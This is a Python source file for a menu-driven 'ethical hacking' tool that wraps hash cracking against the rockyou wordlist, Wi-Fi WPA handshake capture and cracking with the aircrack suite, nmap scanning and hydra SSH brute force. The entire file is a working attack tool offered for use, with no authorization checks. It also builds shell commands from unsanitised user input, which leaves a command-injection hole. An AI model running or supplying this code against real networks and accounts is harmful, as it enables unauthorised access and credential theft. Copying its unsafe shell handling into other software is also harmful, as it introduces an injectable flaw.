#!/usr/bin/env python3
import os
import sys
import hashlib
import zipfile
import subprocess
import time
import requests
import re
from itertools import product
from tqdm import tqdm
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ========================
# TOOL CLASSES
# ========================

class HashCracker:
    @staticmethod
    def crack(hash_value, hash_type, wordlist="/usr/share/wordlists/rockyou.txt"):
        """Crack hashes using wordlist attack."""
        if not os.path.exists(wordlist):
            print(f"{Fore.RED}Error: Wordlist not found at {wordlist}{Style.RESET_ALL}")
            return None

        hash_func = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512
        }.get(hash_type.lower())

        if not hash_func:
            print(f"{Fore.RED}Error: Unsupported hash type{Style.RESET_ALL}")
            return None

        try:
            with open(wordlist, 'r', encoding='latin-1') as f:
                total = sum(1 for _ in f)
            
            with open(wordlist, 'r', encoding='latin-1') as f:
                for password in tqdm(f, total=total, desc="Cracking"):
                    password = password.strip()
                    if hash_func(password.encode()).hexdigest() == hash_value:
                        return password
            return None
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            return None

class WiFiCracker:
    @staticmethod
    def enable_monitor_mode(interface="wlan0"):
        """Enable monitor mode on wireless interface."""
        try:
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
            subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
            return f"{interface}mon"
        except subprocess.CalledProcessError:
            return None

    @staticmethod
    def capture_handshake(bssid, channel, interface, output_file="handshake"):
        """Capture WPA handshake."""
        try:
            cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}"
            proc = subprocess.Popen(cmd, shell=True)
            print(f"{Fore.YELLOW}[*] Capturing handshake (Press Ctrl+C when done)...")
            proc.wait()
            return True
        except:
            return False

    @staticmethod
    def crack_handshake(cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
        """Crack WPA handshake."""
        if not os.path.exists(cap_file):
            print(f"{Fore.RED}Error: Capture file not found{Style.RESET_ALL}")
            return None

        try:
            cmd = f"sudo aircrack-ng -w {wordlist} {cap_file}.cap"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if "KEY FOUND" in result.stdout:
                key = re.search(r"KEY FOUND! \[(.*?)\]", result.stdout).group(1)
                return key
            return None
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            return None

class NetworkScanner:
    @staticmethod
    def quick_scan(target):
        """Perform quick network scan."""
        try:
            cmd = f"nmap -T4 -F {target}"
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}Scan failed: {e}{Style.RESET_ALL}")

class BruteForcer:
    @staticmethod
    def ssh_attack(target, username, wordlist):
        """Brute force SSH service."""
        try:
            cmd = f"hydra -l {username} -P {wordlist} {target} ssh -t 4"
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}SSH brute force failed{Style.RESET_ALL}")

# ========================
# UI FUNCTIONS
# ========================

def display_banner():
    print(f"""{Fore.RED}
   ██╗  ██╗ █████╗ ██╗     ██╗     ███████╗██╗  ██╗
   ██║ ██╔╝██╔══██╗██║     ██║     ██╔════╝╚██╗██╔╝
   █████╔╝ ███████║██║     ██║     █████╗   ╚███╔╝ 
   ██╔═██╗ ██╔══██║██║     ██║     ██╔══╝   ██╔██╗ 
   ██║  ██╗██║  ██║███████╗███████╗███████╗██╔╝ ██╗
   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
    {Fore.CYAN}Kali Linux All-in-One Ethical Hacking Tool
    {Fore.YELLOW}Developed for Security Professionals{Style.RESET_ALL}
    """)

def hash_cracker_menu():
    print(f"\n{Fore.BLUE}Hash Cracker{Style.RESET_ALL}")
    hash_value = input(f"{Fore.YELLOW}Enter hash: {Style.RESET_ALL}").strip()
    hash_type = input(f"{Fore.YELLOW}Hash type (md5/sha1/sha256/sha512): {Style.RESET_ALL}").strip().lower()
    wordlist = input(f"{Fore.YELLOW}Wordlist path [default: rockyou.txt]: {Style.RESET_ALL}").strip() or "/usr/share/wordlists/rockyou.txt"
    
    password = HashCracker.crack(hash_value, hash_type, wordlist)
    if password:
        print(f"{Fore.GREEN}[+] Password found: {password}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Password not found{Style.RESET_ALL}")

def wifi_cracker_menu():
    print(f"\n{Fore.BLUE}Wi-Fi Cracker{Style.RESET_ALL}")
    interface = input(f"{Fore.YELLOW}Wireless interface [wlan0]: {Style.RESET_ALL}").strip() or "wlan0"
    
    monitor_iface = WiFiCracker.enable_monitor_mode(interface)
    if not monitor_iface:
        print(f"{Fore.RED}Failed to enable monitor mode{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}[+] Monitor mode enabled on {monitor_iface}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Run 'sudo airodump-ng {monitor_iface}' to find networks")
    
    bssid = input(f"{Fore.YELLOW}Enter target BSSID: {Style.RESET_ALL}").strip()
    channel = input(f"{Fore.YELLOW}Enter channel: {Style.RESET_ALL}").strip()
    
    if WiFiCracker.capture_handshake(bssid, channel, monitor_iface):
        wordlist = input(f"{Fore.YELLOW}Wordlist path [default: rockyou.txt]: {Style.RESET_ALL}").strip() or "/usr/share/wordlists/rockyou.txt"
        password = WiFiCracker.crack_handshake("handshake", wordlist)
        if password:
            print(f"{Fore.GREEN}[+] Password found: {password}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to crack password{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Failed to capture handshake{Style.RESET_ALL}")

def main_menu():
    while True:
        print(f"\n{Fore.BLUE}Main Menu:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}1. Hash Cracker")
        print("2. Wi-Fi Cracker")
        print("3. Network Scanner")
        print("4. SSH Brute Force")
        print(f"5. Exit{Style.RESET_ALL}")

        choice = input(f"{Fore.YELLOW}>> Select option (1-5): {Style.RESET_ALL}").strip()
        
        if choice == "1":
            hash_cracker_menu()
        elif choice == "2":
            wifi_cracker_menu()
        elif choice == "3":
            target = input(f"{Fore.YELLOW}Enter target IP/range: {Style.RESET_ALL}").strip()
            NetworkScanner.quick_scan(target)
        elif choice == "4":
            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}").strip()
            username = input(f"{Fore.YELLOW}Enter username: {Style.RESET_ALL}").strip()
            wordlist = input(f"{Fore.YELLOW}Wordlist path [default: rockyou.txt]: {Style.RESET_ALL}").strip() or "/usr/share/wordlists/rockyou.txt"
            BruteForcer.ssh_attack(target, username, wordlist)
        elif choice == "5":
            print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")

# ========================
# MAIN EXECUTION
# ========================

if __name__ == "__main__":
    try:
        if os.geteuid() != 0:
            print(f"{Fore.RED}This tool requires root privileges!{Style.RESET_ALL}")
            sys.exit(1)
            
        display_banner()
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[-] Tool terminated by user{Style.RESET_ALL}")
        sys.exit(0)
